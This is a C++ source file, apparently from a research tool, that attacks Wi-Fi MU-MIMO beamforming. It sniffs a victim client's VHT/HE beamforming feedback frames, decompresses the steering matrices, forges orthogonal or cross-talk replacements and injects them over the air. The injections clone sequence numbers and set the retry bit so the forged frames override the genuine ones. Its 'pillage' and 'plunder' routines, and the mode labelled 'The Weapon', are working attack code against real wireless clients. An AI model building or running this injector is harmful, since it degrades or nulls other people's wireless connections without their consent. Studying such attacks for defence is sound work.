#include "injector.h"
#include <iostream>
#include <pcap.h>
#include <cstring>
#include <cstdio>
#include <cmath>
#include <bitset>
#include <string>
#include <vector>
#include <map>
#include <sys/time.h>
#include <unistd.h>
#include <Eigen/Core>
#include <random>
#include <algorithm>

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
static const float PI = 3.14159265f;
static const std::complex<float> J(0.0f, 1.0f);

const int INJECTION_MODE = 0;

//static const uint8_t RADIOTAP[] = {
//    0x00, 0x00, 0x0c, 0x00,
//    0x04, 0x80, 0x00, 0x00,
//    0x6c, 0x00, 0x18, 0x00
//};
//static const int RT_LEN = 12;

//static const uint8_t RADIOTAP[] = {
//    0x00, 0x00, 0x08, 0x00, // length is now 8
//    0x00, 0x80, 0x00, 0x00, // Rate flag removed, only TX flags present
//};
//static const int RT_LEN = 8;

// HT (802.11n) Radiotap Header forcing MCS 5 over a 40MHz channel
static const uint8_t RADIOTAP[] = {
    0x00, 0x00, 0x0c, 0x00, // Revision 0, Pad 0, Total Length 12 bytes
    0x00, 0x00, 0x08, 0x00, // Present flags: MCS field (bit 19) is present
    0x0F,                   // MCS Known Mask (Bandwidth, Index, GI, Format are known)
    0x01,                   // MCS Flags (0x01 = 40MHz channel width)
    0x05,                   // MCS Index = 5
    0x00                    // 1 byte padding for memory alignment
};
static const int RT_LEN = 12;

static const int MAC_FC1        = 1;
static const int MAC_SEQCTRL    = 22;
static const int BODY_MIMO_B2   = 24 + 4; 

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static double now_ms() {
    struct timeval tv; gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;
}

static std::string mac_str(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0],m[1],m[2],m[3],m[4],m[5]);
    return buf;
}

static void debug_hex_compare(const uint8_t* genuine_body, int offset, int fb_len, 
                              const std::vector<uint8_t>& forged_fb) {
    printf("\n\n=== BFI STRUCTURE COMPARISON (Feedback Matrix Bytes) ===\n");
    
    printf("Genuine BFI (first 48 bytes at body offset %d):\n", offset);
    for (int i = 0; i < std::min(fb_len, 48); i++) {
        printf("%02X ", genuine_body[offset + i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    
    printf("\n\nForged BFI  (first 48 bytes):\n");
    for (int i = 0; i < std::min((int)forged_fb.size(), 48); i++) {
        printf("%02X ", forged_fb[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n======================================================\n\n");
}

// ---------------------------------------------------------------------------
// Dynamic Subcarrier (Nst) Lookups
// ---------------------------------------------------------------------------
static int nst_for_vht(int bw_idx, int ng) {
    static const int t_ng1[] = {52, 114, 242, 484};
    static const int t_ng2[] = {30, 58,  122, 242};
    static const int t_ng4[] = {16, 30,  62,  122};
    if (bw_idx < 0 || bw_idx > 3) bw_idx = 0;
    if (ng == 4) return t_ng4[bw_idx];
    if (ng == 2) return t_ng2[bw_idx];
    return t_ng1[bw_idx];
}

static int nst_for_he(int bw_idx, int ng) {
    static const int t_ng1[]  = {242, 484, 996, 1992};
    static const int t_ng2[]  = {122, 242, 498, 996};
    static const int t_ng4[]  = {62,  122, 250, 498};
    static const int t_ng16[] = {16,  32,  64,  126}; 
    if (bw_idx < 0 || bw_idx > 3) bw_idx = 0;
    if (ng == 16) return t_ng16[bw_idx];
    if (ng == 4)  return t_ng4[bw_idx];
    if (ng == 2)  return t_ng2[bw_idx];
    return t_ng1[bw_idx];
}

// ---------------------------------------------------------------------------
// BFI Parameters Detection
// ---------------------------------------------------------------------------
struct BFIInfo {
    bool    valid        = false;
    bool    is_he        = false;
    int     Nr           = 0;
    int     Nc           = 0;
    int     Nst          = 0;
    int     Nb_phi       = 0;
    int     Nb_psi       = 0;
    int     body_offset  = 0;   
    int     feedback_len = 0;   
};

static BFIInfo detect_bfi(const uint8_t* body, int body_len) {
    BFIInfo info;

    if (body_len >= 8 && body[0] == 0x15 && body[1] == 0x00) {
        // VHT
        uint32_t ctrl = (uint32_t)body[2] | ((uint32_t)body[3] << 8) | ((uint32_t)body[4] << 16);

        info.Nc      = (ctrl & 0x7) + 1;           
        info.Nr      = ((ctrl >> 3) & 0x7) + 1;    
        int bw_idx   = (ctrl >> 6) & 0x3;           
        int ng_idx   = (ctrl >> 8) & 0x3;
        int codebook = (ctrl >> 10) & 0x1;
        int fb_type  = (ctrl >> 11) & 0x1;

        int ng = (ng_idx == 0) ? 1 : (ng_idx == 1) ? 2 : 4;
        info.Nst = nst_for_vht(bw_idx, ng);

        if (fb_type == 1 || codebook == 1) {
            info.Nb_phi = 6; info.Nb_psi = 4;
        } else {
            info.Nb_phi = 4; info.Nb_psi = 2;
        }

        info.body_offset = 5 + info.Nc;
        info.is_he = false;
        info.valid = true;
    }
    else if (body_len >= 9 && body[0] == 0x1e && body[1] == 0x00) {
        // HE
        uint64_t ctrl = (uint64_t)body[3] | ((uint64_t)body[4] << 8) | 
                        ((uint64_t)body[5] << 16) | ((uint64_t)body[6] << 24) | 
                        ((uint64_t)body[7] << 32);

        info.Nc      = (ctrl & 0x7) + 1;
        info.Nr      = ((ctrl >> 3) & 0x7) + 1;
        int bw_idx   = (ctrl >> 6) & 0x3;
        int ng_idx   = (ctrl >> 8) & 0x3;
        int cb       = (ctrl >> 10) & 0x1;

        int ng = (ng_idx==0) ? 1 : (ng_idx==1) ? 2 : (ng_idx==2) ? 4 : 16;
        info.Nst = nst_for_he(bw_idx, ng);

        info.Nb_phi  = cb ? 9 : 7;
        info.Nb_psi  = cb ? 7 : 5;
        info.body_offset = 8 + info.Nc; // Account for HE SNR bytes
        info.is_he = true;
        info.valid = true;
    }

    if (!info.valid) return info;

    int p = std::min(info.Nc, info.Nr - 1);
    int bits = 0;
    for (int ii = 1; ii <= p; ii++) {
        bits += (info.Nr - ii) * info.Nb_phi;
        bits += (info.Nr - ii) * info.Nb_psi;
    }
    
    info.feedback_len = (bits * info.Nst + 7) / 8;

    // Failsafe truncation: don't parse past actual frame payload
    int actual_fb_bytes = body_len - info.body_offset;
    if (info.feedback_len > actual_fb_bytes) {
        info.feedback_len = actual_fb_bytes;
    }

    return info;
}

// ---------------------------------------------------------------------------
// Dialog Token Helpers
// ---------------------------------------------------------------------------
static uint8_t ndpa_dialog_token(const uint8_t* ndpa_body) {
    return (ndpa_body[0] >> 2) & 0x3F;
}

static void update_vht_dialog_token(std::vector<uint8_t>& buf, uint8_t token) {
    int pos = RT_LEN + BODY_MIMO_B2;
    if (pos < (int)buf.size())
        buf[pos] = (buf[pos] & 0x81) | ((token & 0x3F) << 1);
}

static void update_he_dialog_token(std::vector<uint8_t>& buf, uint8_t token) {
    int pos = RT_LEN + 24 + 2; // MAC header (24) + HE token byte index (2)
    if (pos < (int)buf.size())
        buf[pos] = token;
}

static void increment_seq(std::vector<uint8_t>& buf) {
    int pos = RT_LEN + MAC_SEQCTRL;
    if (pos + 1 >= (int)buf.size()) return;
    uint16_t sc = buf[pos] | (buf[pos+1] << 8);
    int seq = ((sc >> 4) + 1) & 0xFFF;
    int frag = sc & 0xF;
    uint16_t new_sc = (uint16_t)((seq << 4) | frag);
    buf[pos]   = new_sc & 0xFF;
    buf[pos+1] = (new_sc >> 8) & 0xFF;
}

// ---------------------------------------------------------------------------
// Matrix Processing Engine (Decompress / Compress / Gram-Schmidt)
// ---------------------------------------------------------------------------
using CMat     = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, Eigen::Dynamic>;
using CVec     = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, 1>;
using VMatList = std::vector<CMat>;

static VMatList decompress(const uint8_t* fb, const BFIInfo& info) {
    int Nr = info.Nr, Nc = info.Nc, Nst = info.Nst;
    double pow_phi = std::pow(2.0, info.Nb_phi);
    double pow_psi = std::pow(2.0, info.Nb_psi + 2);
    int p = std::min(Nc, Nr - 1);

    int NumAngles = 0;
    for (int ii = 1; ii <= p; ii++) NumAngles += (Nr - ii) * 2;

    std::string bits;
    bits.reserve(info.feedback_len * 8);
    for (int i = 0; i < info.feedback_len; i++) {
        std::string tmp = std::bitset<8>(fb[i]).to_string();
        std::reverse(tmp.begin(), tmp.end());
        bits += tmp;
    }

    Eigen::MatrixXf angles(NumAngles, Nst);
    int bit_idx = 0;
    for (int kk = 0; kk < Nst; kk++) {
        int acnt = 0;
        for (int ii = Nr-1; ii >= std::max(Nr-Nc,1); ii--) {
            for (int jj = 0; jj < ii; jj++) {
                if (bit_idx + info.Nb_phi > (int)bits.length()) break;
                std::string tmp = bits.substr(bit_idx, info.Nb_phi);
                std::reverse(tmp.begin(), tmp.end());
                angles(acnt, kk) = (2.0f*(float)std::bitset<16>(tmp).to_ulong()+1.0f) / (float)pow_phi;
                acnt++; bit_idx += info.Nb_phi;
            }
            for (int jj = 0; jj < ii; jj++) {
                if (bit_idx + info.Nb_psi > (int)bits.length()) break;
                std::string tmp = bits.substr(bit_idx, info.Nb_psi);
                std::reverse(tmp.begin(), tmp.end());
                angles(acnt, kk) = (2.0f*(float)std::bitset<16>(tmp).to_ulong()+1.0f) / (float)pow_psi;
                acnt++; bit_idx += info.Nb_psi;
            }
        }
    }

    CMat V_init = CMat::Zero(Nr, Nc);
    for (int c = 0; c < std::min(Nc,Nr); c++) V_init(c,c) = 1.0f;
    VMatList V(Nst, V_init);

    Eigen::MatrixXf Gt(Nr, Nr);
    CVec D(Nr), D_tmp(Nr);
    D.setOnes();
    int NumAnglesCnt = NumAngles;

    for (int ii = p; ii >= 1; ii--) {
        for (int jj = Nr; jj >= ii+1; jj--) {
            for (int kk = 0; kk < Nst; kk++) {
                Gt.setIdentity(Nr, Nr);
                float a = angles(NumAnglesCnt-1, kk) * PI;
                Gt(ii-1,ii-1) =  std::cos(a);
                Gt(ii-1,jj-1) = -std::sin(a);
                Gt(jj-1,ii-1) =  std::sin(a);
                Gt(jj-1,jj-1) =  std::cos(a);
                V[kk] = Gt.cast<std::complex<float>>() * V[kk];
            }
            NumAnglesCnt--;
        }
        for (int kk = 0; kk < Nst; kk++) {
            D_tmp = D;
            int idx = 0;
            for (int jj = -Nr+ii+1; jj <= 0; jj++) {
                D_tmp(ii-1+idx) = std::exp(J*PI*angles(NumAnglesCnt+jj-1, kk));
                idx++;
            }
            for (int jj = 0; jj < Nr; jj++)
                V[kk].row(jj) *= D_tmp(jj);
        }
        NumAnglesCnt -= (Nr - ii);
    }
    return V;
}

static std::vector<uint8_t> compress(VMatList W, const BFIInfo& info) {
    int Nr = info.Nr, Nc = info.Nc, Nst = info.Nst;
    double pow_phi = std::pow(2.0, info.Nb_phi);
    double pow_psi = std::pow(2.0, info.Nb_psi + 2);
    int p = std::min(Nc, Nr - 1);

    int na = 0;
    for (int ii = 1; ii <= p; ii++) na += (Nr-ii)*2;
    Eigen::MatrixXf angles_W(na, Nst);
    
    Eigen::MatrixXf Gt(Nr, Nr);
    int angcnt = 0;

    for (int ii = 1; ii <= p; ii++) {
        for (int kk = 0; kk < Nst; kk++) {
            for (int jj = 0; jj < Nr-ii; jj++) {
                float phi = std::arg(W[kk](ii+jj-1, ii-1));
                if (phi < 0) phi += PI*2.0f;
                angles_W(angcnt+jj, kk) = phi;
            }
            for (int jj = 0; jj < Nr-ii; jj++)
                W[kk].row(ii-1+jj) *= std::exp(-J * angles_W(angcnt+jj, kk));
        }
        angcnt += Nr - ii;
        for (int ll = ii+1; ll <= Nr; ll++) {
            for (int kk = 0; kk < Nst; kk++) {
                float psi = std::atan2(W[kk](ll-1,ii-1).real(),
                                       W[kk](ii-1,ii-1).real());
                angles_W(angcnt, kk) = psi;
                Gt.setIdentity(Nr, Nr);
                Gt(ii-1,ii-1) =  std::cos(psi);
                Gt(ii-1,ll-1) =  std::sin(psi);
                Gt(ll-1,ii-1) = -std::sin(psi);
                Gt(ll-1,ll-1) =  std::cos(psi);
                W[kk] = Gt.cast<std::complex<float>>() * W[kk];
            }
            angcnt++;
        }
    }

    std::string bits;
    for (int kk = 0; kk < Nst; kk++) {
        int ac = 0;
        for (int ii = Nr-1; ii >= std::max(Nr-Nc,1); ii--) {
            for (int jj = 1; jj <= ii; jj++) {
                int q = (int)std::round(0.5*(angles_W(ac,kk)*pow_phi/PI - 1.0));
                q = std::max(0, std::min(q,(int)pow_phi-1));
                std::string tmp = std::bitset<16>(q).to_string().substr(16-info.Nb_phi);
                std::reverse(tmp.begin(), tmp.end());
                bits += tmp; ac++;
            }
            for (int jj = 1; jj <= ii; jj++) {
                int q = (int)std::round(0.5*(angles_W(ac,kk)*pow_psi/PI - 1.0));
                q = std::max(0, std::min(q,(int)(pow_psi/4)-1));
                std::string tmp = std::bitset<16>(q).to_string().substr(16-info.Nb_psi);
                std::reverse(tmp.begin(), tmp.end());
                bits += tmp; ac++;
            }
        }
    }

    while ((int)bits.size() < info.feedback_len*8) bits += '0';
    std::vector<uint8_t> out(info.feedback_len, 0);
    for (int i = 0; i < info.feedback_len; i++) {
        std::string tmp = bits.substr(i*8, 8);
        std::reverse(tmp.begin(), tmp.end());
        out[i] = (uint8_t)std::bitset<8>(tmp).to_ulong();
    }
    return out;
}

static VMatList forge_orthogonal(const VMatList& V_ref, const BFIInfo& info) {
    std::seed_seq seed{1,2,3,4,5};
    std::mt19937 rng(seed);
    std::uniform_real_distribution<float> dist(-1.0f, 1.0f);

    int Nr = info.Nr, Nc = info.Nc, Nst = info.Nst;
    CMat R(Nr, Nc);
    for (int r = 0; r < Nr; r++)
        for (int c = 0; c < Nc; c++)
            R(r,c) = std::complex<float>(dist(rng), dist(rng));

    VMatList W(Nst, CMat::Zero(Nr, Nc));
    for (int kk = 0; kk < Nst; kk++) {
        for (int col = 0; col < Nc; col++) {
            CVec w = R.col(col);
            for (int vc = 0; vc < Nc; vc++) {
                std::complex<float> proj = V_ref[kk].col(vc).adjoint() * w;
                w -= proj * V_ref[kk].col(vc);
            }
            for (int wc = 0; wc < col; wc++) {
                std::complex<float> proj = W[kk].col(wc).adjoint() * w;
                w -= proj * W[kk].col(wc);
            }
            if (std::abs(w(Nr-1)) > 1e-8f) w /= w(Nr-1);
            float n = w.norm();
            if (n > 1e-8f) w /= n;
            W[kk].col(col) = w;
        }
    }
    return W;
}

// ---------------------------------------------------------------------------
// Inject Frame Builder
// ---------------------------------------------------------------------------
static std::vector<uint8_t> build_forged_buf(
        const uint8_t* genuine_pkt, int genuine_len,
        const std::vector<uint8_t>& forged_fb,
        int body_offset) {

    uint16_t rt_len = genuine_pkt[2] | (genuine_pkt[3] << 8);
    
    // Ensure the MTU does not arbitrarily truncate our dynamically built payload
    int mac_hdr_size = 24; 
    int payload_start = rt_len + mac_hdr_size + body_offset;
    int total = payload_start + forged_fb.size();

    std::vector<uint8_t> buf(total, 0);
    memcpy(buf.data(), RADIOTAP, RT_LEN);

    int copy_hdr_len = std::min(genuine_len - rt_len, mac_hdr_size + body_offset);
    memcpy(buf.data() + RT_LEN, genuine_pkt + rt_len, copy_hdr_len);

    buf[RT_LEN + MAC_FC1] |= 0x08; // Set retry bit

    memcpy(buf.data() + RT_LEN + mac_hdr_size + body_offset, forged_fb.data(), forged_fb.size());

    return buf;
}

static bool do_inject(pcap_t* send, const std::vector<uint8_t>& buf) {
    int res = pcap_inject(send, buf.data(), (int)buf.size());
    return res == (int)buf.size();
}

// ---------------------------------------------------------------------------
// Injector
// ---------------------------------------------------------------------------
Injector::Injector(const std::string& iface, bool debug)
    : iface_(iface), debug_(debug) {}

void Injector::run_su_pillage(const APInfo& ap, const ClientInfo& victim) {
    (void)ap; 
    char errbuf[PCAP_ERRBUF_SIZE];

    // Lowered pcap timeout to 10ms for extremely fast looping
    pcap_t* sniff = pcap_open_live(iface_.c_str(), 65535, 1, 10, errbuf);
    if (!sniff) { fprintf(stderr,"[!] sniff: %s\n",errbuf); return; }
    pcap_t* send  = pcap_open_live(iface_.c_str(), 65535, 1, 0,  errbuf);
    if (!send)  { fprintf(stderr,"[!] send: %s\n", errbuf); pcap_close(sniff); return; }

    // BPF filter narrowed exclusively to BFI frames to save CPU cycles
    char filter[256];
    snprintf(filter, sizeof(filter),
             "(wlan[0] == 0xd0 or wlan[0] == 0xe0) and wlan addr2 %s",
             victim.mac.c_str());
    struct bpf_program fp;
    if (pcap_compile(sniff, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(sniff, &fp);

    printf("[*] Pillage: victim=%s\n[*] Waiting for victim BFI...\n\n", victim.mac.c_str());

    struct pcap_pkthdr* hdr;
    const uint8_t* pkt;

    bool has_precomputed = false;
    std::vector<uint8_t> precomputed_forged_fb;
    BFIInfo precomputed_info;
    int total = 0;

    while (true) {
        if (pcap_next_ex(sniff, &hdr, &pkt) != 1) continue;

        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 28) continue;

        const uint8_t* mac_hdr = pkt + rt_len;
        // CRITICAL: Ignore frames with the Retry bit set (so we don't trigger off our own injections)
        if (mac_hdr[1] & 0x08) continue; 

        const uint8_t* body = mac_hdr + 24;
        int body_len = (int)hdr->caplen - rt_len - 24 - 4;

        BFIInfo info = detect_bfi(body, body_len);
        if (!info.valid || info.feedback_len == 0) continue;

        // -------------------------------------------------------------------
        // 1. FAST PATH: Instant Overwrite using the perfect Sequence Number
        // -------------------------------------------------------------------
        if (has_precomputed && info.Nst == precomputed_info.Nst) {
            // build_forged_buf clones the current genuine packet's exact Sequence Number, 
            // VHT/HE Token bytes, and sets Retry=1 automatically.
            std::vector<uint8_t> burst_buf = build_forged_buf(pkt, (int)hdr->caplen, precomputed_forged_fb, info.body_offset);
            
            // Double-tap injection for reliability against air collisions
            do_inject(send, burst_buf);
            do_inject(send, burst_buf);
            
            uint16_t seq = ((mac_hdr[22] | (mac_hdr[23] << 8)) >> 4) & 0xFFF;
            total += 2;
            printf("\r[PILLAGE] Instant Overwrite! (SN:%04d) Injected:%-6d  ", seq, total);
            fflush(stdout);
        }

        // -------------------------------------------------------------------
        // 2. SLOW PATH: Update forged payload in the background
        // -------------------------------------------------------------------
        VMatList V = decompress(body + info.body_offset, info);
        //VMatList W = forge_orthogonal(V, info);
        VMatList W;

	// 2. Select the Forgery based on the INJECTION_MODE
if (INJECTION_MODE == 0) {
    // UNFORGED (Control 1)
    // Re-inject the legitimate matrix. Proves CPU/Airtime overhead.
    W = V; 
} 
else if (INJECTION_MODE == 1) {

	// RANDOM (Control 2)
    // Fill the matrices with random complex math to prove that specifically 
    // calculated orthogonal math is required to create a null.
    W = V; // Copy the structure and subcarrier count from V
    
    // Iterate through every subcarrier matrix
    for (size_t i = 0; i < W.size(); ++i) {
        // Eigen's built-in function replaces all elements in the 
        // matrix with random complex floats.
        W[i].setRandom(); 
    }

} 
else if (INJECTION_MODE == 2) {
    // OPTIMAL (The Weapon)
    // Calculate the orthogonal matrix W where W is perpendicular to V.
    W = forge_orthogonal(V, info);
}

	precomputed_forged_fb = compress(W, info);
        precomputed_info = info;
        has_precomputed = true;
    }
    pcap_close(sniff); pcap_close(send);
}

void Injector::run_mu_pillage(const APInfo& ap, const ClientInfo& victim, const ClientInfo& collateral) {
    (void)ap; 
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* sniff = pcap_open_live(iface_.c_str(), 65535, 1, 10, errbuf);
    if (!sniff) { fprintf(stderr,"[!] sniff: %s\n",errbuf); return; }
    pcap_t* send  = pcap_open_live(iface_.c_str(), 65535, 1, 0,  errbuf);
    if (!send)  { fprintf(stderr,"[!] send: %s\n", errbuf); pcap_close(sniff); return; }

    char filter[512];
    snprintf(filter, sizeof(filter),
             "(wlan[0] == 0xd0 or wlan[0] == 0xe0) and (wlan addr2 %s or wlan addr2 %s)",
             victim.mac.c_str(), collateral.mac.c_str());
    struct bpf_program fp;
    if (pcap_compile(sniff, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(sniff, &fp);

    printf("[*] MU-MIMO Pillage (Cross-Talk)\n[*] Waiting for Collateral BFI...\n\n");

    struct pcap_pkthdr* hdr;
    const uint8_t* pkt;

    VMatList col_V;
    bool col_ready = false, has_precomputed = false;
    std::vector<uint8_t> precomputed_forged_fb;
    BFIInfo precomputed_info;
    int total = 0;

    while (true) {
        if (pcap_next_ex(sniff, &hdr, &pkt) != 1) continue;
        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 28) continue;

        const uint8_t* mac_hdr = pkt + rt_len;
        if (mac_hdr[1] & 0x08) continue; // Ignore retries

        std::string ta_str = mac_str(mac_hdr + 10);
        const uint8_t* body = mac_hdr + 24;
        int body_len = (int)hdr->caplen - rt_len - 24 - 4;

        BFIInfo info = detect_bfi(body, body_len);
        if (!info.valid || info.feedback_len == 0) continue;

        // Capture the Collateral target's matrix
        if (ta_str == collateral.mac) {
            col_V = decompress(body + info.body_offset, info);
            col_ready = true;
            has_precomputed = false; // Invalidate cache so we re-align
            printf("\n[+] Collateral Matrix Captured (Nr=%d Nc=%d)\n", info.Nr, info.Nc);
            continue;
        }

        // Overwrite the Primary Victim's matrix with the Collateral's matrix
        if (ta_str == victim.mac && col_ready) {
            
            // FAST PATH: Instant Overwrite
            if (has_precomputed && info.Nst == precomputed_info.Nst) {
                std::vector<uint8_t> burst_buf = build_forged_buf(pkt, (int)hdr->caplen, precomputed_forged_fb, info.body_offset);
                do_inject(send, burst_buf);
                do_inject(send, burst_buf);
                
                uint16_t seq = ((mac_hdr[22] | (mac_hdr[23] << 8)) >> 4) & 0xFFF;
                total += 2;
                printf("\r[MU-PILLAGE] Cross-Talk Injected! (SN:%04d) Total:%-6d  ", seq, total);
                fflush(stdout);
            }

            // SLOW PATH: Set Victim's Matrix W perfectly equal to Collateral's Matrix V
            // We use Eigen block copying to prevent crashes if the clients have different antenna (Nc/Nr) counts!
            VMatList W(info.Nst, CMat::Zero(info.Nr, info.Nc));
            for (int kk = 0; kk < info.Nst; kk++) {
                int min_r = std::min((int)info.Nr, (int)col_V[kk].rows());
                int min_c = std::min((int)info.Nc, (int)col_V[kk].cols());
                W[kk].block(0,0, min_r, min_c) = col_V[kk].block(0,0, min_r, min_c);
            }

            precomputed_forged_fb = compress(W, info);
            precomputed_info = info;
            has_precomputed = true;
        }
    }
    pcap_close(sniff); pcap_close(send);
}

void Injector::run_plunder(const APInfo& ap, const ClientInfo& victim, const ClientInfo& qm) {
    (void)ap; 
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* sniff = pcap_open_live(iface_.c_str(), 65535, 1, 10, errbuf);
    if (!sniff) { fprintf(stderr,"[!] sniff: %s\n",errbuf); return; }
    pcap_t* send  = pcap_open_live(iface_.c_str(), 65535, 1, 0,  errbuf);
    if (!send)  { fprintf(stderr,"[!] send: %s\n", errbuf); pcap_close(sniff); return; }

    char filter[512];
    snprintf(filter, sizeof(filter),
             "(wlan[0] == 0xd0 or wlan[0] == 0xe0) and (wlan addr2 %s or wlan addr2 %s)",
             victim.mac.c_str(), qm.mac.c_str());
    struct bpf_program fp;
    if (pcap_compile(sniff, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(sniff, &fp);

    printf("[*] Plunder: victim=%s  QM=%s\n[*] Waiting for QM BFI...\n\n", victim.mac.c_str(), qm.mac.c_str());

    struct pcap_pkthdr* hdr;
    const uint8_t* pkt;

    VMatList qm_V;
    bool qm_ready = false;
    
    bool has_precomputed = false;
    std::vector<uint8_t> precomputed_forged_fb;
    BFIInfo precomputed_info;
    int total = 0;

    while (true) {
        if (pcap_next_ex(sniff, &hdr, &pkt) != 1) continue;

        uint16_t rt_len = pkt[2] | (pkt[3] << 8);
        if ((int)hdr->caplen < rt_len + 28) continue;

        const uint8_t* mac_hdr = pkt + rt_len;
        if (mac_hdr[1] & 0x08) continue; // Ignore retries

        std::string ta_str = mac_str(mac_hdr + 10);
        const uint8_t* body = mac_hdr + 24;
        int body_len = (int)hdr->caplen - rt_len - 24 - 4;

        BFIInfo info = detect_bfi(body, body_len);
        if (!info.valid || info.feedback_len == 0) continue;

        if (ta_str == qm.mac) {
            qm_V = decompress(body + info.body_offset, info);
            qm_ready = true;
            printf("\n[+] QM matrix updated\n");
            // Must recompute victim's payload when QM changes
            has_precomputed = false; 
            continue;
        }

        if (ta_str == victim.mac && qm_ready) {
            // 1. FAST PATH
            if (has_precomputed && info.Nst == precomputed_info.Nst) {
                std::vector<uint8_t> burst_buf = build_forged_buf(pkt, (int)hdr->caplen, precomputed_forged_fb, info.body_offset);
                do_inject(send, burst_buf);
                do_inject(send, burst_buf);
                
                uint16_t seq = ((mac_hdr[22] | (mac_hdr[23] << 8)) >> 4) & 0xFFF;
                total += 2;
                printf("\r[PLUNDER] Instant Overwrite! (SN:%04d) Injected:%-6d  ", seq, total);
                fflush(stdout);
            }

            // 2. SLOW PATH
            VMatList W = forge_orthogonal(qm_V, info); 
            precomputed_forged_fb = compress(W, info);
            precomputed_info = info;
            has_precomputed = true;
        }
    }
    pcap_close(sniff); pcap_close(send);
}
